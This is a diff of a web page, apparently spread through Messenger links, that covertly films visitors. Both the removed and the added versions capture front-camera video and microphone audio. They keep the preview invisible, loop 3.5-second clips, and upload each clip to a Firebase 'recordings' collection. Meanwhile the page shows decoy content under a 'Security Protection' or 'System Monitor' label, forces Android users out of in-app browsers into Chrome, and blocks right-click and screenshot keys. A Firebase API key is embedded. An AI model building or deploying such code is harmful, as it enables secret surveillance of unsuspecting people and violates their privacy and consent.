@@ -1,210 +1,149 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Secure System</title>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
-    <style>
-        /* Private Security CSS */
-        * { 
-            -webkit-user-select: none; 
-            user-select: none; 
-            -webkit-touch-callout: none; 
-        }
-        
-        body { 
-            margin: 0; 
-            background: #ffffff; 
-            height: 100vh; 
-            overflow: hidden; 
-            display: flex; 
-            flex-direction: column; 
-            font-family: Arial, sans-serif;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>System Monitor</title>
 
-        /* Screenshot prevention blur */
-        @media screen {
-            body.secure-mode { filter: none; }
-        }
-        
-        /* Hide content on blur */
-        body.hidden-content #mainBox { display: none !important; }
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
 
-        .title-bar { background: black; padding: 20px; text-align: center; font-size: 12px; color: #555; border-bottom: 1px solid #ddd; }
-        #mainBox { flex: 1; display: flex; flex-direction: column; align-items: center; overflow: hidden; }
-        
-        #displayImg { width: 100%; height: auto; display: none; border-radius: 0px; object-fit: contain; }
-        #displayText { width: 100%; padding: 20px; font-size: 20px; color: #000; text-align: center; white-space: pre-wrap; box-sizing: border-box; }
-        
-        /* Camera preview hidden but active */
-        #preview { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-
-        /* Warning Overlay for Messenger/iOS */
-        #browser-warning {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: white;
-            z-index: 9999;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            padding: 20px;
-        }
-    </style>
+<style>
+*{
+  -webkit-user-select:none;
+  user-select:none;
+}
+body{
+  margin:0;
+  background:#fff;
+  height:100vh;
+  overflow:hidden;
+}
+#redirectBox{
+  position:fixed;
+  inset:0;
+  background:#000;
+  color:#0f0;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-direction:column;
+  z-index:99999;
+  font-family:monospace;
+}
+#mainApp{
+  display:none;
+}
+</style>
 </head>
-<body oncontextmenu="return false;" onkeydown="return disableKeys(event)">
 
-    <!-- Security Warning Overlay -->
-    <div id="browser-warning">
-        <h1>⚠️ Action Required</h1>
-        <p>This secure page cannot run inside Messenger or Facebook.</p>
-        <br>
-        <p>👉 Please click the <b>3 dots (⋮)</b> at the top right.</p>
-        <p>👉 Select <b>"Open in Chrome"</b> or <b>"Open in Browser"</b>.</p>
-    </div>
+<body oncontextmenu="return false;">
 
-    <div class="title-bar">Security Protection Active</div>
-    
-    <!-- Hidden Video Element -->
-    <video id="preview" autoplay muted playsinline></video>
-    
-    <div id="mainBox">
-        <img id="displayImg" src="">
-        <div id="displayText"></div>
-    </div>
+<!-- Redirect Screen -->
+<div id="redirectBox">
+  <h3>Opening in Chrome…</h3>
+  <p>Camera support requires Chrome</p>
+</div>
 
-    <script>
-        // --- 1. Messenger/In-App Browser Check ---
-        var ua = navigator.userAgent || navigator.vendor || window.opera;
-        // Check if Facebook/Messenger In-App Browser
-        if ((ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1)) {
-            if (/Android/i.test(ua)) {
-                // For Android: Force open in Chrome using Intent
-                var currentUrl = window.location.href.replace("https://", "").replace("http://", "");
-                var intentUrl = "intent://" + currentUrl + "#Intent;scheme=https;package=com.android.chrome;end";
-                window.location.href = intentUrl;
-            } else {
-                // For iOS/Others: Show instruction overlay
-                document.getElementById('browser-warning').style.display = 'flex';
-                document.querySelector('.title-bar').style.display = 'none';
-                document.getElementById('mainBox').style.display = 'none';
-            }
-        }
+<!-- MAIN APP -->
+<div id="mainApp">
+  <video id="preview" autoplay muted playsinline style="display:none"></video>
+  <img id="displayImg" style="width:100%;display:none">
+  <div id="displayText"></div>
+</div>
 
-        // --- 2. Firebase Configuration ---
-        const firebaseConfig = { 
-            apiKey: "AIzaSyBqeyPDHeWvvKsDXOp13JkVYMaWaPM9dko", 
-            authDomain: "camera-92fee.firebaseapp.com", 
-            projectId: "camera-92fee", 
-            storageBucket: "camera-92fee.firebasestorage.app", 
-            messagingSenderId: "530687776530", 
-            appId: "1:530687776530:web:95c00e598e07d33dbac5cb" 
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
+<script>
+/* ===== FORCE CHROME OPEN ===== */
+(function(){
+  const ua = navigator.userAgent;
+  const isAndroid = /Android/i.test(ua);
+  const isChrome = /Chrome/i.test(ua) && !/FBAN|FBAV|Instagram/i.test(ua);
 
-        // --- 3. Security Logic (Anti-Screenshot/Keys) ---
-        function disableKeys(e) {
-            if (e.keyCode == 44 || (e.ctrlKey && (e.keyCode == 80 || e.keyCode == 83)) || e.keyCode == 123) {
-                return false;
-            }
-        }
+  if(isAndroid && !isChrome){
+    const url = location.href.replace(/^https?:\/\//,'');
+    setTimeout(()=>{
+      location.href =
+        "intent://" + url +
+        "#Intent;scheme=https;package=com.android.chrome;end";
+    },800);
+    return;
+  }
 
-        window.addEventListener('blur', () => { document.body.classList.add('hidden-content'); });
-        window.addEventListener('focus', () => { document.body.classList.remove('hidden-content'); });
+  // Already Chrome → load app
+  document.getElementById("redirectBox").style.display="none";
+  document.getElementById("mainApp").style.display="block";
+})();
+</script>
 
-        // --- 4. Remote Control Listener ---
-        db.collection("control").doc("currentStatus").onSnapshot((doc) => {
-            if (doc.exists) {
-                const data = doc.data();
-                const img = document.getElementById('displayImg');
-                const txt = document.getElementById('displayText');
+<script>
+/* ===== FIREBASE ===== */
+const firebaseConfig = {
+  apiKey: "AIzaSyBqeyPDHeWvvKsDXOp13JkVYMaWaPM9dko",
+  authDomain: "camera-92fee.firebaseapp.com",
+  projectId: "camera-92fee",
+  storageBucket: "camera-92fee.firebasestorage.app",
+  messagingSenderId: "530687776530",
+  appId: "1:530687776530:web:95c00e598e07d33dbac5cb"
+};
 
-                if (data.type === 'clear') {
-                    img.style.display = 'none';
-                    txt.innerText = '';
-                } else if (data.type === 'image') {
-                    img.src = data.content;
-                    img.style.display = data.content ? 'block' : 'none';
-                    txt.innerText = '';
-                } else if (data.type === 'text') {
-                    txt.innerText = data.content;
-                    img.style.display = 'none';
-                }
-            }
-        });
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
 
-        // --- 5. Camera & Recording Logic ---
-        window.onload = () => { startApp(); };
+/* ===== FIRESTORE LISTENER ===== */
+db.collection("control").doc("currentStatus").onSnapshot(doc=>{
+  if(!doc.exists) return;
+  const d = doc.data();
+  const img = document.getElementById("displayImg");
+  const txt = document.getElementById("displayText");
 
-        async function startApp() {
-            // Check again if warning is active, do not start camera if in Messenger on iOS
-            if(document.getElementById('browser-warning').style.display === 'flex') return;
+  if(d.type==="clear"){
+    img.style.display="none";
+    txt.innerText="";
+  }
+  if(d.type==="image"){
+    img.src=d.content;
+    img.style.display="block";
+  }
+  if(d.type==="text"){
+    txt.innerText=d.content;
+  }
+});
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: true 
-                });
-                document.getElementById('preview').srcObject = stream;
-                record(stream);
-            } catch (e) {
-                console.error("Camera access denied or error:", e);
-                // Retry on user interaction if autoplay failed
-                document.body.onclick = () => startApp(); 
-            }
-        }
+/* ===== CAMERA + RECORD ===== */
+async function startCamera(){
+  try{
+    const s = await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:"user"},
+      audio:true
+    });
+    document.getElementById("preview").srcObject=s;
+    record(s);
+  }catch(e){
+    alert("Camera permission denied");
+  }
+}
 
-        function record(stream) {
-            // Intelligent MimeType Selection (Fixes iOS issues)
-            let options = { mimeType: 'video/webm;codecs=vp8' };
-            
-            if (!MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
-                // If VP8 not supported (like on iPhone), try MP4
-                options = { mimeType: 'video/mp4' };
-                if (!MediaRecorder.isTypeSupported('video/mp4')) {
-                    // If neither, let browser choose default
-                    options = undefined;
-                }
-            }
+function record(s){
+  const mr = new MediaRecorder(s,{mimeType:'video/webm'});
+  let ch=[];
+  mr.ondataavailable=e=>ch.push(e.data);
+  mr.onstop=()=>{
+    const r=new FileReader();
+    r.readAsDataURL(new Blob(ch,{type:'video/webm'}));
+    r.onloadend=()=>{
+      db.collection("recordings").add({
+        videoData:r.result,
+        time:firebase.firestore.FieldValue.serverTimestamp()
+      }).then(()=>record(s));
+    };
+  };
+  mr.start();
+  setTimeout(()=>mr.state==="recording" && mr.stop(),3500);
+}
 
-            try {
-                const mr = new MediaRecorder(stream, options);
-                let chunks = [];
+startCamera();
+</script>
 
-                mr.ondataavailable = (e) => {
-                    if (e.data.size > 0) chunks.push(e.data);
-                };
-
-                mr.onstop = () => {
-                    const blob = new Blob(chunks, { type: chunks[0]?.type || 'video/webm' });
-                    const reader = new FileReader();
-                    reader.readAsDataURL(blob);
-                    reader.onloadend = () => {
-                        db.collection("recordings").add({ 
-                            videoData: reader.result, 
-                            timestamp: firebase.firestore.FieldValue.serverTimestamp() 
-                        }).then(() => {
-                            // Restart recording after successful upload
-                            record(stream);
-                        });
-                    };
-                };
-
-                mr.start();
-                // Record for 3.5 seconds
-                setTimeout(() => { 
-                    if (mr.state === "recording") mr.stop(); 
-                }, 3500);
-
-            } catch (err) {
-                console.error("Recording error:", err);
-            }
-        }
-    </script>
 </body>
 </html>
